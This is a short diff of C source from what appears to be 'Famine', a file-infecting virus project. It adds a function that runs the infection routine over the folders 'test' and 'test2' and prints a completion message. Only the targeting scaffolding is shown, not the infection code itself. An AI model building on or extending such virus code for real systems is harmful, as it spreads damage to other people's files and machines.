@@ -70,6 +70,15 @@ static t_famine		*alloc_famine()
 }
 
 /*
+** Infect folders
+*/
+void				infect_folders(t_famine *famine)
+{
+	infect_folder(famine, "test");
+	infect_folder(famine, "test2");
+}
+
+/*
 ** Initialization of the famine routine
 */
 void				init_famine(int argc, char **argv)
@@ -81,8 +90,8 @@ void				init_famine(int argc, char **argv)
 		if (famine->debug == true) {
 			start_debug_console();
 		}
-		infect_folder(famine, "test");
-		//print_message(famine, "Famine job's done !");
+		infect_folders(famine);
+		print_message(famine, "\nFamine job's done !", false);
 		if (famine->debug == true) {
 			while (true) ;
 		}
